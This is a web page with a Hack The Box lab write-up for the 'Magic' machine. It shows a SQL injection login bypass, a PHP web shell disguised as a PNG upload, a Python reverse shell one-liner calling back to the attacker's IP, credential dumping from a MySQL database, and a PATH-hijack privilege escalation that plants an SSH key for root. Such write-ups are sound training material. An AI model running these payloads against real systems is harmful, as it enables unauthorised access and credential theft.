<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Enumeration Only two ports are open: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 # Nmap 7.80 scan initiated Sat Apr 18 22:30:30 2020 as: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 Warning: 10.10.10.185 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.185 Host is up (0.048s latency). Not shown: 971 closed ports, 27 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://foxmaccloud.com/writeups/hackthebox/magic/" />


    <title>
        
            Hack The Box - Magic :: FoxCorp  — Welcome to FoxCorp!
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">






<meta itemprop="name" content="Hack The Box - Magic">
<meta itemprop="description" content="Enumeration Only two ports are open: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 # Nmap 7.80 scan initiated Sat Apr 18 22:30:30 2020 as: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 Warning: 10.10.10.185 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.185 Host is up (0.048s latency). Not shown: 971 closed ports, 27 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0."><meta itemprop="datePublished" content="2020-05-05T06:47:08+02:00" />
<meta itemprop="dateModified" content="2020-05-05T06:47:08+02:00" />
<meta itemprop="wordCount" content="991"><meta itemprop="image" content="http://foxmaccloud.com/"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://foxmaccloud.com/"/>

<meta name="twitter:title" content="Hack The Box - Magic"/>
<meta name="twitter:description" content="Enumeration Only two ports are open: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 # Nmap 7.80 scan initiated Sat Apr 18 22:30:30 2020 as: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 Warning: 10.10.10.185 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.185 Host is up (0.048s latency). Not shown: 971 closed ports, 27 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0."/>




    <meta property="og:title" content="Hack The Box - Magic" />
<meta property="og:description" content="Enumeration Only two ports are open: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 # Nmap 7.80 scan initiated Sat Apr 18 22:30:30 2020 as: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185 Warning: 10.10.10.185 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.185 Host is up (0.048s latency). Not shown: 971 closed ports, 27 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://foxmaccloud.com/writeups/hackthebox/magic/" /><meta property="og:image" content="http://foxmaccloud.com/"/><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2020-05-05T06:47:08+02:00" />
<meta property="article:modified_time" content="2020-05-05T06:47:08+02:00" /><meta property="og:site_name" content="FoxCorp" />







    <meta property="article:published_time" content="2020-05-05 06:47:08 &#43;0200 CEST" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ cd /home/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/posts/">Posts</a></li><li><a href="/whoami/">whoami</a></li><li><a href="/writeups/">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://foxmaccloud.com/writeups/hackthebox/magic/">Hack The Box - Magic</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="enumeration">Enumeration</h2>
<ol>
<li>Only two ports are open:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.80 scan initiated Sat Apr 18 22:30:30 2020 as: nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.185</span>
</span></span><span style="display:flex;"><span>Warning: 10.10.10.185 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.185
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">971</span> closed ports, <span style="color:#ae81ff">27</span> filtered ports
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Magic Portfolio
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Apr 18 22:30:44 2020 -- 1 IP address (1 host up) scanned in 14.23 seconds</span>
</span></span></code></pre></div><ol start="2">
<li>
<p>Page at <a href="http://10.10.10.185">http://10.10.10.185</a> shows some images catalog. It also mentioned that you need to login to upload the images.</p>
</li>
<li>
<p>Images are located in a static folder like <a href="http://10.10.10.185/images/uploads/*.jpeg">http://10.10.10.185/images/uploads/*.jpeg</a></p>
</li>
<li>
<p>Scanned the box with <code>gobuster</code> and discovered few other pages:</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.10.185/ -x php -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">200</span> -o initial-gobuster-scan
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.0.1
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.10.185/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:     php
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2020/09/06 12:14:25 Starting gobuster
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/images <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/assets <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/upload.php <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/logout.php <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/login.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<ol>
<li>Back to <a href="http://10.10.10.185/login.php">http://10.10.10.185/login.php</a> and try SQLi:</li>
</ol>
<pre tabindex="0"><code>username: &#39; or 1=1; -- -
password: &#39; or 1=1; -- -
</code></pre><ol start="2">
<li>
<p>And we got in! Page redirected to <a href="http://10.10.10.185/upload.php">http://10.10.10.185/upload.php</a>. But trying to upload any web shell failed with alert: &ldquo;Sorry, only JPG, JPEG &amp; PNG files are allowed.&rdquo;</p>
</li>
<li>
<p>We need to confort this. Get PHP shell from <a href="https://github.com/jgor/php-jpeg-shell/raw/master/shell.php">https://github.com/jgor/php-jpeg-shell/raw/master/shell.php</a>, rename it to <code>shell.php.png</code> and upload completes without any complains. Nice!</p>
</li>
<li>
<p>From main page review we know upload folder location: <a href="http://10.10.10.185/images/uploads/">http://10.10.10.185/images/uploads/</a>. Try to open <a href="http://10.10.10.185/images/uploads/shell.php.png">http://10.10.10.185/images/uploads/shell.php.png</a> and it shows command input ready to execute.</p>
</li>
<li>
<p>Start a listener:</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><ol start="6">
<li>Execute reverse shell from WEB PHP shell:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.14&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><ol start="7">
<li>And we got a shell!</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@ubuntu:~/Magic/images/uploads$ ls -la
</span></span><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">7400</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">18</span> 12:40 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> www-data www-data    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">14</span> 05:04 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">5289209</span> Oct <span style="color:#ae81ff">22</span> 00:44 7.jpg
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">1455770</span> Oct <span style="color:#ae81ff">22</span> 01:02 giphy.gif
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">25290</span> Apr <span style="color:#ae81ff">18</span> 12:07 kibers.png
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data  <span style="color:#ae81ff">124278</span> Oct <span style="color:#ae81ff">22</span> 01:01 logo.png
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data  <span style="color:#ae81ff">100328</span> Oct <span style="color:#ae81ff">22</span> 01:01 magic-1424x900.jpg
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">37787</span> Oct <span style="color:#ae81ff">22</span> 01:01 magic-hat_23-2147512156.jpg
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">71417</span> Apr <span style="color:#ae81ff">18</span> 12:39 magic-stwand.jpg
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data   <span style="color:#ae81ff">67973</span> Oct <span style="color:#ae81ff">22</span> 01:01 magic-wand.jpg
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data       <span style="color:#ae81ff">8</span> Apr <span style="color:#ae81ff">18</span> 12:30 r.png
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data     <span style="color:#ae81ff">192</span> Apr <span style="color:#ae81ff">18</span> 12:40 shell.php.png
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data     <span style="color:#ae81ff">192</span> Apr <span style="color:#ae81ff">18</span> 12:23 shell.png
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root     root      <span style="color:#ae81ff">361568</span> Apr <span style="color:#ae81ff">14</span> 04:56 trx.jpg
</span></span><span style="display:flex;"><span>www-data@ubuntu:~/Magic/images/uploads$
</span></span></code></pre></div><h2 id="getting-user">Getting user</h2>
<ol>
<li>From <code>/var/www/Magic/db.php5</code> file we got MySQL credentials:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Database</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Magic&#39;</span> ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbHost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span> ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbUsername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;theseus&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbUserPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;iamkingtheseus&#39;</span>;
</span></span></code></pre></div><ol start="2">
<li>Using these credentials it&rsquo;s possible to create MySQL dump:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysqldump --databases Magic -u theseus -p iamkingtheseus &gt; magic.sql
</span></span></code></pre></div><ol start="3">
<li>From SQL-dump we got admin credentials:</li>
</ol>
<pre tabindex="0"><code>LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
</code></pre><ol start="4">
<li>Trying to reuse this password for user:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@ubuntu:/dev/shm$ su theseus
</span></span><span style="display:flex;"><span>su theseus
</span></span><span style="display:flex;"><span>Password: Th3s3usW4sK1ng
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>theseus@ubuntu:~$ cat user.txt
</span></span><span style="display:flex;"><span>cat user.txt
</span></span><span style="display:flex;"><span>b0fdfe563dc8c153cebf91eab51166c2
</span></span><span style="display:flex;"><span>theseus@ubuntu:~$ pwd
</span></span><span style="display:flex;"><span>pwd
</span></span><span style="display:flex;"><span>/home/theseus
</span></span><span style="display:flex;"><span>theseus@ubuntu:~$ ls -la
</span></span><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">84</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">15</span> theseus theseus <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">16</span> 02:58 .
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> theseus theseus    <span style="color:#ae81ff">9</span> Oct <span style="color:#ae81ff">21</span> 03:26 .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> theseus theseus  <span style="color:#ae81ff">220</span> Oct <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> theseus theseus   <span style="color:#ae81ff">15</span> Oct <span style="color:#ae81ff">21</span> 03:25 .bash_profile
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> theseus theseus <span style="color:#ae81ff">3771</span> Oct <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> .bashrc
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">13</span> theseus theseus <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">13</span> 05:57 .cache
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">13</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:30 .config
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Desktop
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Documents
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Downloads
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">21</span> 03:49 .gnupg
</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> theseus theseus <span style="color:#ae81ff">7334</span> Apr <span style="color:#ae81ff">15</span> 23:50 .ICEauthority
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">21</span> 03:49 .local
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Music
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Pictures
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Public
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">21</span> 07:31 .ssh
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Templates
</span></span><span style="display:flex;"><span>-r--------  <span style="color:#ae81ff">1</span> theseus theseus   <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">18</span> 03:59 user.txt
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> theseus theseus <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">22</span> 03:28 Videos
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
<ol>
<li>We have non-default SUID-file:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theseus@ubuntu:~$ ls -la /bin/sysinfo
</span></span><span style="display:flex;"><span>-rwsr-x--- <span style="color:#ae81ff">1</span> root users <span style="color:#ae81ff">22040</span> Oct <span style="color:#ae81ff">21</span> 03:45 /bin/sysinfo
</span></span></code></pre></div><ol start="2">
<li>And we are in a right group to run it:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theseus@ubuntu:~$ id theseus
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>
</span></span></code></pre></div><ol start="3">
<li>Running it with <code>ltrace</code> revealed that <code>free</code> command runs without full path and so we can try to control the execution:</li>
</ol>
<ul>
<li>Create custom file:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theseus@ubuntu:/dev/shm$ cat free
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex;"><span>cat /root/root.txt
</span></span><span style="display:flex;"><span>mkdir /root/.ssh
</span></span><span style="display:flex;"><span>cat /home/theseus/.ssh/authorized_keys &gt;&gt; /root/.ssh/authorized_keys
</span></span></code></pre></div><ul>
<li>Make it executable:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theseus@ubuntu:/dev/shm$ chmod +x free
</span></span></code></pre></div><ul>
<li>Adjust PATH variable:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theseus@ubuntu:~$ export PATH<span style="color:#f92672">=</span>/dev/shm:$PATH
</span></span></code></pre></div><ol start="4">
<li>
<p>Running <code>sysinfo</code> prints root&rsquo;s hash and also copies our SSH key to root&rsquo;s location.</p>
</li>
<li>
<p>SSH in as root:</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa.pub root@10.10.10.185
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 5.3.0-42-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Canonical Livepatch is available <span style="color:#66d9ef">for</span> installation.
</span></span><span style="display:flex;"><span>   - Reduce system reboots and improve kernel security. Activate at:
</span></span><span style="display:flex;"><span>     https://ubuntu.com/livepatch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span> packages can be updated.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates are security updates.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Your Hardware Enablement Stack <span style="color:#f92672">(</span>HWE<span style="color:#f92672">)</span> is supported <span style="color:#66d9ef">until</span> April 2023.
</span></span><span style="display:flex;"><span>Last login: Sat Apr <span style="color:#ae81ff">18</span> 14:47:23 <span style="color:#ae81ff">2020</span> from 10.10.14.14
</span></span><span style="display:flex;"><span>root@ubuntu:~# cat root.txt
</span></span><span style="display:flex;"><span>392e6cbdbbb527970f14098612325fe7
</span></span><span style="display:flex;"><span>root@ubuntu:~#
</span></span></code></pre></div>
            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span> <a href="http://foxmaccloud.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/FoxMaccloud">Fox Maccloud</a></span>
        </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>



    </body>
</html>
